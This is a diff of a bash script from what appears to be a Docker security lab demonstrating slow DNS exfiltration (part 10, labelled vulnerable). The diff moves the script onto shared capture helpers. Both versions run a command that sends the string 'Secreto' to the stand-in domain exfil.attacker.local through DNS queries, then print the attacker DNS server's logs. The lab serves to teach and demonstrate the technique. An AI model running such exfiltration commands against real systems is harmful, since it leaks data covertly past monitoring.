@@ -1,13 +1,19 @@
 #!/usr/bin/env bash
 set -euo pipefail
-echo "========== PUNTO 10 — SLOW DNS EXFIL [VULNERABLE] =========="
-P="docker compose -p p10v -f docker-compose.yml"
-trap '$P down -v 2>/dev/null || true' EXIT
-$P down -v 2>/dev/null || true
-$P up -d --build
+ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
+source "${ROOT}/lib/capture_helpers.sh"
+init_compose "p10v" "docker-compose.yml"
+trap 'teardown_lab 2>/dev/null || true' EXIT
+
+setup_lab
 sleep 4
-$P exec host python3 /lab/slow_dns.py exfil.attacker.local Secreto
+
+section "10" "SLOW DNS EXFILTRATION" "VULNERABLE"
+prompt_attack "10.9.0.102" "python3 /lab/slow_dns.py exfil.attacker.local Secreto"
+run_exec host python3 /lab/slow_dns.py exfil.attacker.local Secreto
 sleep 3
-echo "[*] Consultas registradas en DNS atacante:"
-$P logs attacker-dns 2>/dev/null | tail -15 || true
-$P down -v
+blank_line
+prompt_server "10.9.0.101" "docker compose logs attacker-dns  # consultas exfiltradas"
+${COMPOSE} logs attacker-dns 2>/dev/null | tail -12 || true
+
+teardown_lab
